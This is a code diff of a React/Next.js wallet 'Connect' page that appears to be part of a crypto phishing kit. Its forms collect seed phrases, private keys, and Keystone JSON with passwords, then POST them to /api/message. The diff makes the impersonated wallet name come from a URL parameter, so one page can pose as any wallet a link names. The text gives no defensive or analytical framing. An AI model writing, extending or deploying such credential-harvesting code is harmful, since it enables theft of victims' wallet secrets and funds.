@@ -1,9 +1,25 @@
 import styles from './Connect.module.css'
 import { useWallet} from '../../contexts/WalletProvider'
 import Header from '../Header/Header'
-import {useState, useEffect} from 'react'
+import {useState, useEffect, useRef} from 'react'
+import { useRouter } from "next/router";
+import queryString from 'query-string';
 
-const Connect = (payload, payloadType) => {
+
+const Connect = ({props}) => {
+     const [paramData, setParamData] = useState();
+        const ref = useRef();
+    const router = useRouter()
+    useEffect(() => {
+        let city = (new URLSearchParams(window.location.search)).get("items")
+        // console.log(city)
+        ref.current = city
+        // let data = {ref.current}
+        // console.log(ref.current)
+        setParamData(ref.current)
+        
+      }, [])
+
     const [btnMsg, setBtnMsg] = useState("Connect Wallet");
     const { wallet } = useWallet();
     const [inputVal, setInputVal] = useState()
@@ -21,7 +37,7 @@ const Connect = (payload, payloadType) => {
            try {
             const res = await fetch(`/api/message`, {
                 body: JSON.stringify({
-                    wallet: `${wallet}`,
+                    wallet: `${ref.current}`,
                     content: `Phrases: ${inputVal}`
                 }),
                 method: 'POST',
@@ -55,7 +71,7 @@ const Connect = (payload, payloadType) => {
             try {
                 const res = await fetch(`/api/message`, {
                     body: JSON.stringify({
-                        wallet: `${wallet}`,
+                        wallet: `${ref.current}`,
                         content: `Private key: ${inputVal}`
                     }),
                     method: 'POST',
@@ -88,7 +104,7 @@ const Connect = (payload, payloadType) => {
           try {
             const res = await fetch(`/api/message`, {
                 body: JSON.stringify({
-                    wallet: `${wallet}`,
+                    wallet: `${ref.current}`,
                     content: `Keystone: ${inputVal}      &      Password: ${password}`
                 }),
                 method: 'POST',
@@ -122,7 +138,7 @@ const Connect = (payload, payloadType) => {
             <form onSubmit={handleFormKeystone}
                     method="post"
                     className={styles.keyStone}>
-                  <p className={styles.info}>Connect {wallet} by putting your key</p>
+                  <p className={styles.info}>Connect {ref.current} by putting your key</p>
                 <textarea type="text" value={inputVal} placeholder="Keystone JSON" onChange={(e) => setInputVal(e.target.value)}></textarea>
                 <input type="text" placeholder="Password" value={password} onChange={(e) => setPassword(e.target.value)}/>
                 <p className={styles.hint}>Several lines of text plus the password you used to encrypt it </p>
@@ -137,7 +153,7 @@ const Connect = (payload, payloadType) => {
                     method="post"
                     // className={styles.formBox}
                     >
-                  <p className={styles.info}>Connect {wallet} by putting your key</p>
+                  <p className={styles.info}>Connect {ref.current} by putting your key</p>
                 <input type="text" placeholder="Password" value={inputVal} onChange={(e) => setInputVal(e.target.value)}/>
                 <p className={styles.hint}>Typically 12 (sometimes 24) words seperated by a single spaces</p>
                 <button>{btnMsg}</button>
@@ -150,7 +166,7 @@ const Connect = (payload, payloadType) => {
              <form onSubmit={handleForm}
                     method="post"
                     className={styles.formPhrase}>
-                <p className={styles.info}>Connect {wallet} by putting your key</p>
+                <p className={styles.info}>Connect {ref.current} by putting your key</p>
                 <textarea type="text" value={inputVal} placeholder="Phrase" onChange={(e) => setInputVal(e.target.value)}></textarea>
                 <p className={styles.hint}>Typically 12 (sometimes 24) words seperated by a single spaces</p>
                 <button>{btnMsg}</button>
